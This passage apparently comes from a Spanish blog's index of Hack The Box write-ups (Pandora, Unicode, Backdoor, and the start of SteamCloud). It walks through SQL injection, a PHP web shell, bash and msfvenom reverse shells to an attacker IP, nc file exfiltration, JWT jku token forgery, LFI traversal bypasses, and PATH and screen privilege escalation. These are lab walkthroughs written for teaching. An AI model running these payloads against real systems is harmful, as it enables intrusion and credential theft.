página.Encontramos un exploit que nos permite dumpear la base de datos y conseguir una shell interactiva. En él, se realiza una petición por metodo GET a la siguiente url:http://pandora.pandora.htb/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGOVamos a realizar la petición manualmente y posteriormente conseguiremos la cookie del administrador.Obtención cookie del administradorIntroducimos la cookie del administrador y ya seremos capaces de visualizar el panel de administración.Panel de administraciónBuscando en el panel de administración encontramos un apartado llamado Admin tools, en él encontramos otro subapartado llamado File manager, en este subapartado vamos a ser capaces de subir un archivo que nos sirva como web shell.Web shell en php:&lt;?php if(isset($_GET['cmd'])) { system($_GET['cmd']); }?&gt;Upload WebshellAhora entremos en la dirección en la que se encuentra nuestra web shell.Comprobación WebshellPara hacerlo de una forma más eficaz y cómoda vamos a entablarnos una reverse shell hacia nuestro equipo. Lo primero de todo, es ponernos en escucha utilizando netcat.❯ nc -nlvp 8080 listening on [any] 8080 ...Ya estando en escucha introducimos el siguiente comando en la web shell, es IMPORTANTE que lo introduzcamos codificado en url. Podemos utilizar páginas web como esta o herramientas como urlencode.bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.169/8080 0&gt;&amp;1\"Ya hemos establecido la reverse shell, ahora vamos a tratar la shell para hacerla completamente funcional.❯ nc -nlvp 8080listening on [any] 8080 ...Connection from 10.10.11.136:45244❯ script /dev/null -c bashScript started, file is /dev/null❯ CTRL + Z[1]+ Detenido\t\tnc -nlvp 8080❯ stty raw -echo; fgnc -nlvp 8080\tresetreset: unknow terminal type unknownTerminal type? xterm❯ export SHELL=bash❯ export TERM=xterm❯ stty rows 42 columns 174Vamos a comprobar con que usuario hemos entrado y los grupos a los que pertenece.❯ iduid=1000(matt) gid=1000(matt) groups=1000(matt)Ya hemos conseguido convertirnos en el usuario matt, ahora tendremos que escalar hasta el usuario root, pero no sin antes leer la flag del usuario.❯ cat user.txt318fe6b33493c95d****************Si recordamos, al principio cuando conseguimos acceder a la máquina víctima mediante el usuario daniel encontramos un binario con permisos SUID, sin embargo, no podiamos interactuar con el debido a que no contabamos con los permisos necesarios. Ahora, ya que nos hemos convertido en el usuario matt podemos interactuar con él.Vamos a traernos el binario a nuestro equipo para poder analizarlo más comodamente.Máquina víctimanc 10.10.14.169 4040 &lt; /usr/bin/pandora_backupNuestra equiponc -nlvp 4040 &gt; binarioAhora que ya está el binario en nuestro equipo vamos a empezar a analizarlo. No vamos a poder leerlo ya que contiene código fuente almacenado, podríamos intentar ver si hay algunas líneas legibles con el comando strings.❯ strings binario/lib64/ld-linux-x86-64.so.2putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!Check your permissions!Backup successful!Terminating program!\t\t\t\t\t---SKIP---Podemos ver que el binario utiliza la herramienta tar para comprimir todos los archivos de la ruta /var/www/pandora/pandora_console/* al archivo comprimido /root/.backup/pandora-backup.tar.gz. El fallo que podemos aprovechar es que hace referencia a la herramienta tar de forma relativa por lo que podríamos modificar el PATH para que primero compruebe un directorio en el que hemos creado un archivo malicioso llamado tar que será ejecutado. Un PATH Hijacking en toda regla.❯ mktemp -d/tmp/tmp.422JbdGPDX❯ cd /tmp/tmp.422JbdGPDX❯ touch tar❯ chmod +x !$chmod +x tar❯ echo $(which bash) &gt; tar❯ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin❯ export PATH=$(pwd):$PATH ❯ echo $PATH/tmp/tmp.422JbdGPDX:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin❯ pandora_backup PandoraFMS Backup UtilityNow attempting to backup PandoraFMS client❯ whoamiroot❯ cat /root/root.txtbf749c890f5c9b4b****************" }, { "title": "Unicode Writeup", "url": "/posts/writeup-unicode/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Medium, JWT, LFI", "date": "2022-05-07 00:00:00 +0200", "snippet": "Máquina Medium, crearemos un token malicioso en una web para hacernos pasar por un administrador, en el panel de administrador encontraremos un LFI, consiguiendo listar un archivo con credenciales, por último, vemos que podemos ejecutar un binario como root, lo ejecutamos y conseguimos leer la flag de root.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.126PING 10.10.11.126 (10.10.11.126) 56(84) bytes of data.64 bytes from 10.10.11.126: icmp_seq=1 ttl=63 time=34.9 ms--- 10.10.11.126 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 34.921/34.921/34.921/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.126 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.10.11.126 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del comandoStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-05 23:44 CESTScanning 10.10.11.126 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80 -sC -sV 10.10.11.126 -oN targeted -p22,80 &gt; Indica los puertos que se quieren escanear, en este caso el 22 y 80 -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.126 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del comando:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-05 23:47 CESTNmap scan report for 10.10.11.126PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)| 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)|_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: 503|_http-trane-info: Problem with XML parsing of /evox/about|_http-server-header: nginx/1.18.0 (Ubuntu)Los puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; httpEmpezaremos enumerando el puerto 80, primero podemos hacer un reconocimiento web con dirsearch, utilizaremos fuerza bruta para enumerar recursos.disearch -u http://10.10.11.126 -x 503 -u http://10.10.11.126 &gt; Indica la url -x 503 &gt; Oculta las peticiones con un código de estadoLos recursos que hemos hallado son los siguientes:Target: http://10.10.11.126/[00:34:38] Starting: [00:34:53] 308 - 264B - /checkout -&gt; http://10.10.11.126/checkout/[00:34:55] 308 - 266B - /dashboard -&gt; http://10.10.11.126/dashboard/[00:34:55] 308 - 258B - /debug -&gt; http://10.10.11.126/debug/[00:34:55] 502 - 568B - /debug/[00:34:56] 308 - 258B - /error -&gt; http://10.10.11.126/error/[00:34:59] 308 - 264B - /internal -&gt; http://10.10.11.126/internal/[00:35:01] 200 - 84KB - /login/[00:35:07] 308 - 264B - /redirect -&gt; http://10.10.11.126/redirect/[00:35:09] 404 - 564B - /static/api/swagger.yaml[00:35:09] 404 - 564B - /static/api/swagger.json[00:35:09] 404 - 564B - /static/dump.sql[00:35:12] 308 - 260B - /upload -&gt; http://10.10.11.126/upload/No tenemos nada demasiado interesante de momento, sigamos mirando que nos puede ofrecer la página. Si investigamos más a fondo podemos ver que estamos arrastrando una cookie.Si observamos el código fuente de la página podemos encontrarnos con lo siguiente /redirect/?url=google.com esto nos puede servir para más adelante.Busqueda de vulnerabilidadesVamos a analizar la cookie que estamos arrastrando, parece que es un JWT (JSON Web Token), estos tokens estan divididos en 3 partes: Header &gt; usualmente consiste en dos partes, la primera parte (typ), indica el tipo de token y la segunda (alg) indica el algoritmo que ha sido utilizado. Payload &gt; contiene parámetros del token, existen tres tipos de parámtros, registered, public y private. Signature &gt; se utiliza para verificar que el emisor del JWT es quien dice ser y para garantizar que el mensaje no hay sido modificado, esta parte es creada firmando con el algoritmo especificado el header, el payload y una llave.Partes Token JWTLos tokens JWT podemos descifrarlos utilizando la siguiente web.JWT DescifradoEn la parte de los headers vemos un parámetro llamado jku, este parámetro es una URI que apunta a un recurso con claves públicas codificadas en JSON, una de estas claves se corresponde con la utilizada para crear la parte signature del Token JWT.Intentemos acceder a la url que contiene la clave que verifica los tokens, para ellos tendremos que añadir el dominio hackmedia.htb al fichero /etc/hosts.{ \"keys\": [ { \"kty\": \"RSA\", \"use\": \"sig\", \"kid\": \"hackthebox\", \"alg\": \"RS256\", \"n\": \"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\", \"e\": \"AQAB\" } ]}Puesto que la clave que se utiliza para verificar el token se extrae del certificado ubicado en la URI (jku), podríamos intentar generar un nuevo token malicioso que tenga como URI una clave alojada en nuestro servidor para así hacernos pasar por otro usuario.ExplotaciónPrimeramente crearemos las claves con las que verificaremos y crearemos el token.❯ openssl genrsa -out keypair.pem 2048❯ openssl rsa -in keypair.pem -pubout -out publickey.crt❯ openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key publickey.crt &gt; clave pública pkcs8.key &gt; clave privadaYa teniendo la clave pública y privada podremos crear un token malicioso. Utilizaremos el siguiente script para generarlo, este script manipula la URI del parámetro jku asignandole una URL con la pueda llegar a conectarse a nuestro servidor ayudandose de la ruta que encontramos al principio, asigna el valor admin al parámetro user y, finalmente firma el token con el par de claves.#!/usr/bin/python3from email import headerfrom jwcrypto import jwk, jwtwith open(\"keypair.pem\", \"rb\") as pemfile: key = jwk.JWK.from_pem(pemfile.read())Token = jwt.JWT(header={\"alg\": \"RS256\",\"jku\": \"http://hackmedia.htb/static/../redirect?url=10.10.14.242:8080/jwks.json\"},claims={\"user\":\"admin\"})Token.make_signed_token(key)print(Token.serialize())Este sería nuestro token malicioso:eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjQyOjgwODAvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.qRR4zH6-LJJuOmxVUIyuEzsW4ijqm1VnmUhDSZRVLSIOKFpC8Om5HssQGdLma3d-Zkw8gkISGy0mQ7J8hG9ODH1kinPnIL9u5BL4pyztmMUUqHXqIQ11EVmxH2gwL4laHKg86t_VZ3TwoIp7ruDbZ_Aaqu1ESPN0LpBevqKu54BgnFgogSqt8ruzzlU5IuQrje3zPf7g1QSr7sgARwIL5qRf19atR_lz-l-V411HZ5ItCRlsyr__r2QO3DtD03OuF2Wk8MJH4F1LjxEwB-M0v6W6JQf-bxx9AAoA401FBoP7_wES1T-SFjruU2gF8mHGdgk-5lWVnvS5R4zrwS8I8QAhora generaremos el archivo que validará el token y que será apuntado por el parámetro jku de nuestro token malicioso. Para ello primero nos traeremos el que trae la máquina víctima.❯ wget http://hackmedia.htb/static/jwks.jsonEste fichero será al que apuntemos con el parametro jku para que nos valide el token, primero necesitaremos sustituir los parametros n y e de nuestra clave pública por los de el fichero jwks.json, para conseguir n y e de la clave pública utilizaremos el siguiente script:#!/usr/bin/python3import jwkestfrom Crypto.PublicKey import RSAfp = open(\"publickey.crt\", \"r\")key = RSA.importKey(fp.read())fp.close()print(\"n:\", jwkest.long_to_base64(key.n))print(\"e:\", jwkest.long_to_base64(key.e)) n: qV5Smp4lxwvgY8POIWXWpAsDDBatymCkAIxBS4sgsuk49Lb29zNiLififZz4v6z9VOywTxJBHi6a0t06QyeyfPg0roa8t-JqlDuWjAjF6F80nB4yBh-u6u8ggTRSR-cpLrr3d0QbNHTOQB2zrpCXuUW3uY-BUNk2QyPPCjzyZdO1RGZBEXtTo6CTZecEqFd0Li0cK9NywPzSqUuzzHe9pzmDMQONUezkcxTtN9tbcOiHMrsUTpwxzNeyGu9Mtt3gI2Hle6gYNFWdxsY7S642KYgRAu6OVi5nwwi46n2J41n7fnskk6Hzpr2o-jg93zMZfit1JV2rRLG__p-k1EldaQ e: AQABCuando ya hayamos sustituido los parámetros n y e en el archivo jwks.json y tengamos preparado el token malicioso nos levantaremos un servidor web para que cuando se vaya a validar el token pueda apuntar al archivo que tenemos en local.❯ python -m http.server 8080Editamos la cookie con el token JWT malicioso y recargamos la página.Panel de AdministraciónAnalizando el panel de adminitración podemos ver algunas cosas interesantes como la url del apartado Current month y Last quarter. A simple vista se hace parecido a un LFI (Local File Inclusion), sin embargo, no conseguimos acceder a ningun archivo, tendremos que tirar de algún bypass para poder listar archivos. Buscando encontré la siguiente página.Entre todos los bypass que he visto solo he encontrado uno que me haya servido, es el siguiente:http://hackmedia.htb/display/?page=%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8Fetc%EF%BC%8FpasswdYa tenemos una forma potencial de enumerar archivos, como se esta utilizando nginx como servidor web podríamos empezar a enumerar los archivos de configuración del servidor. Empezaremos con el fichero /etc/nginx/nginx.conf.El fichero llama a otros recursos, empezaremos a enumerar lo que hay dentro de estas carpetas. Encontramos un fichero muy interesante ubicado en /etc/nginx/sites-enabled/default, este fichero nos indica la existencia de un fichero con credenciales, las credenciales son guardadas en el fichero /home/code/coder/db.yaml. Accedemos al archivo y veremos las credenciales.mysql_host: \"localhost\"mysql_user: \"code\"mysql_password: \"B3stC0d3r2021@@!\"mysql_db: \"user\"Estas credenciales nos servirán para conectarnos por ssh.Post-explotaciónYa podemos leer la flag del usuario❯ cat user.txtbb562deb8b7b476e****************Vamos a ver si podemos interactuar con algun ejecutable sin proporcionar contraseñas.❯ sudo -lMatching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser code may run the following commands on code: (root) NOPASSWD: /usr/bin/treportVemos que podemos interactuar con el ejectuble treport como el usuario root sin proporcionar contraseña.Al ejecurtarlo nos da 3 opciones, crear un reporte, leer un reporte o descargar un reporte. En este punto lo que podriamos hacer es descargarnos como un reporte la flag de root.❯ sudo treport 1.Create Threat Report.2.Read Threat Report.3.Download A Threat Report.4.Quit.❯ Enter your choice:3❯ Enter the IP/file_name:File:///root/root.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 33 100 33 0 0 16500 0 --:--:-- --:--:-- --:--:-- 16500❯ Enter your choice:2ALL THE THREAT REPORTS:threat_report_08_59_01❯ Enter the filename:threat_report_08_59_0125bebc130f32b387****************" }, { "title": "Backdoor Writeup", "url": "/posts/writeup-backdoor/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, Wordpress, LFI, SUID, Directory Traversal, Bash Scripting", "date": "2022-04-27 00:00:00 +0200", "snippet": "Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.125PING 10.10.11.125 (10.10.11.125) 56(84) bytes of data.64 bytes from 10.10.11.125: icmp_seq=1 ttl=63 time=40.1 ms--- 10.10.11.125 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 40.147/40.147/40.147/0.000 msEn la salida del comando anterior se puede ver un parametro llamado ttl, gracias a este parametro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos estan abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.10.11.125 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del comandoStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:53 CESTScanning 10.10.11.125 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 631337/tcp open waste syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80,1337 -sC -sV 10.10.11.125 -oN targeted -p22,80,1337 &gt; Indica los puertos que se quieren escanear, en este caso el 22, 80 y 1337 -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.125 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del comando:Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:59 CESTNmap scan report for 10.10.11.125PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-Life|_http-generator: WordPress 5.8.11337/tcp open waste?Los puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; http 1337/tcp &gt; ?Al entrar a la web podemos ver que se esta usando un gestor de contenidos Wordpress, esto lo podemos ver gracias a un plugin del navegador llamado Wappalyzer, también podemos acceder a esta información desde la consola con la herramienta whatweb.❯ whatweb http://10.10.11.125/http://10.10.11.125/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &amp;#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]Busqueda de vulnerabilidadesEl servidor está corriendo la versión 5.8.1 de Wordpress, tras investigar un poco se puede ver que esta versión de Wordpress no tiene ninguna vulnerabilidad interesante, sin embargo, puede haber algun plugin que si tenga alguna, lo que convertiria al gestor de contenidos en vulnerable.Existen varias herramientas para enumerar gestores de contenido, en este caso utilizare WPScan (herramienta para enumerar Wordpress).❯ wpscan --url http://10.10.11.125 -e vp[i] No plugins Found -e &gt; Enumera vp &gt; Vulnerable PluginsLa herramienta no nos detecta ningún plugin, vamos a intentar enumerar el gestor de contenido de forma manual. El directorio en el que se alojan los plugins es http://10.10.11.125/wp-content/plugins/.Plugins WordpressPodemos observar que existe un plugin que no nos ha mostrado WPScan, vamos a ver si este plugin tiene alguna vulnerabilidad asociada.❯ searchsploit ebook wordpress---------------------------------------------------------------- ------------------------- Exploit Title | Path---------------------------------------------------------------- -------------------------WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txtPodemos ver que el plugin eBook Download tiene asociada una vulnerabilidad que nos permite leer archivos del servidor (LFI) desde la siguiente ruta:http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.phpExplotaciónTenemos un LFI (Local File Inclusion), que juntado con un Directory Traversal nos permitirá ser capaces de leer archivos del servidor, vamos a intentar ver los usuarios existentes en la máquina víctima.❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd' | grep \"sh$\"root:x:0:0:root:/root:/bin/bashuser:x:1000:1000:user:/home/user:/bin/bashYa tenemos un usuario con el que podriamos autenticarnos mediante ssh, ahora solamente necesitaremos algunas contraseñas. Podemos ver el archivo que utiliza Wordpress para la configuración de la comunicación con la base de datos.❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'Conseguimos credenciales de la base de datos// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wordpressuser' );/** MySQL database password */define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8' );/** The database collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );Desgraciadamente la máquina víctima no tiene MYSQL expuesto, podríamos intentar autenticarnos contra el servicio ssh o contra el panel de administrador de Wordpress pero no tendremos exito en ninguno de los casos anteriores.Puesto que no podemos autenticarnos contra el sistema tendremos que seguir consiguiendo información mediante el LFI. Uno de los directorios m s importantes para conseguir información es el /proc, este directorio contiene un subdirectorio por cada proceso que se esté ejecutando. Nos puede ser útil a la hora de enumerar el kernel y los procesos.Sabiendo esto, podemos conseguir ver que puertos estan abiertos internamente con el siguiente one-liner:for port in $(curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/net/tcp' | awk '{print $2}' | grep -v \"local_address\" | awk '{print $2}' FS=\":\" | sort -u); do echo \"[$port] -&gt; Puerto $(echo \"ibase=16; $port\" | bc)\" ;donePodemos ver que la máquina víctima tiene los siguientes puertos abiertos internamente:[0016] -&gt; Puerto 22[0035] -&gt; Puerto 53[0539] -&gt; Puerto 1337[0CEA] -&gt; Puerto 3306[8124] -&gt; Puerto 33060[9B5A] -&gt; Puerto 39770[B2D0] -&gt; Puerto 45776Sigamos recopilando información, ahora intentaremos listar y obtener información sobre como se crearon todos los procesos que están en ejecución, para ello necesitaremos listar una serie de objetos de los procesos, puede ver más información sobre esto aquí. Usaremos el siguiente script para enumerar los servicios:#!/bin/bashfor pid in $(curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/sched_debug' --output - | awk '{print $3}' | grep -oP \"\\d{1,6}\" | sort -u); do \tcontent=$(timeout 1 bash -c \"curl -s \"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/$pid/cmdline\"\" --output - | awk -F 'cmdline' '{print $4}' | awk -F '&lt;script&gt;' '{print $1}' | tr -d \"\\0\" &amp;)\tif [[ $content ]]; then\t\techo \"[*] PID $pid: \" | tr -d \"\\n\"\t\techo $content\tfidoneLa salida nos devuelve algunas cosas interesantes, los procesos con el PID (Process IDentifier) 791, 138936, 138937 y 138942 nos muestran que esta corriendo gdbserver en el puerto 1337. También nos muestra un proceso (PID 788) que utiliza el comando screen, esto nos puede llegar a servir en la escalada de privilegios.[*] PID 788: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done[*] PID 791: /bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done[*] PID 811: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups[*] PID 1027: /usr/sbin/mysqld[*] PID 1032: /usr/sbin/mysqld[*] PID 136293: /bin/sh[*] PID 136404: /bin/bash[*] PID 138937: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;[*] PID 139002: -/bin/bash¿Qué es gdbserver?gdbserver es un programa informático que permite depurar otros programas de forma remota.gdbserver cuenta con una vulnerabilidad para la versión 9.2 que nos permitira obtener un RCE (Remote Command Execution).❯ searchsploit gdbserver---------------------------------------------------------------- ------------------------- Exploit Title | Path---------------------------------------------------------------- -------------------------GNU gdbserver 9.2 - Remote Command Execution (RCE) | linux/remote/50539.pyEl exploit nos pedirá que generemos una reverse shell con la herramienta msfvenom.❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.242 LPORT=443 PrependFork=true -o rev.bin[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 106 bytesSaved as: rev.binEsta reverse shell indica que cuando se ejecute envie una shell a la IP 10.10.14.242 por el puerto 443.❯ python3 exploit.py 10.10.11.125:1337 rev.bin[+] Connected to target. Preparing exploit[+] Found x64 arch[+] Sending payload[*] Pwned!! Check your listenerTenemos acceso a la máquina víctima :DPost-explotaciónYa podriamos leer la flag del usuarios, pero primero haremos funcional la terminal, para que podamos hacer CTRL + C, CTRL + V…❯ nc -nlvp 443 listening on [any] 443 ...connect to [10.10.14.242] from (UNKNOWN) [10.10.11.125] 41368❯ script /dev/null -c bashScript started, file is /dev/null❯ user@Backdoor:/home/user$ CTRL + Z[1]+ Detenido\t\tnc -nlvp 443❯ stty raw -echo; fgnc -nlvp 443\tresetreset: unknow terminal type unknownTerminal type? xterm❯ export SHELL=bash❯ export TERM=xterm❯ stty rows 49 columns 189Ahora si, leeremos la flag del usuario.❯ cat user.txt9d44e4692ebdcf2d****************Empezaremos con una enumeración básica, vamos a ver si pertenecemos a algun grupo interesante:❯ iduid=1000(user) gid=1000(user) groups=1000(user)No tenemos nada interesante, podemos empezar a enumerar binarios con permisos SUID.❯ find / -perm -u=s 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/at/usr/bin/su/usr/bin/sudo/usr/bin/newgrp/usr/bin/fusermount/usr/bin/screen/usr/bin/umount/usr/bin/mount/usr/bin/chsh/usr/bin/pkexecTodos estos binarios es normal que tengan permisos SUID, pero recordemos que en la enumeración de procesos descubrimos que se estaba ejecutando el comando screen. Ese proceso comprobaba cada segundo que un directorio estubiera vacío, de ser este el caso ejecutaba screen -dmS root.Este comando crea con el usuario root una sesión llamada root, gracias a que hemos enumerado los binarios con permisos SUID sabemos que podemos utilizar el comando screen como root, por lo tanto podemos acceder a su sesión.❯ screen -r root/root❯ whoamirootYa podemos leer la flag de root❯ cat root.txtfb01c701a89c7223****************" }, { "title": "SteamCloud Writeup", "url": "/posts/writeup-steamcloud/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Kubernetes, Easy, Cloud, RCE", "date": "2022-04-20 00:00:00 +0200", "snippet": "Máquina Easy, encontramos un contenedor en kubernetes vulnerable a un RCE, nos aprovechamos que podemos crear pods para hacer uno desde la raiz de archivos de esta forma consiguiendo leer archivos necesarios para mandarnos una reverse shell como root.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.133PING 10.10.11.133 (10.10.11.133) 56(84) bytes of data.64 bytes from 10.10.11.133: icmp_seq=1 ttl=63 time=41.5 ms--- 10.10.11.133 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 41.518/41.518/41.518/0.000 msEn la salida del comando anterior se puede ver un parametro llamado ttl, gracias a este parametro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos estan abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.133 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open 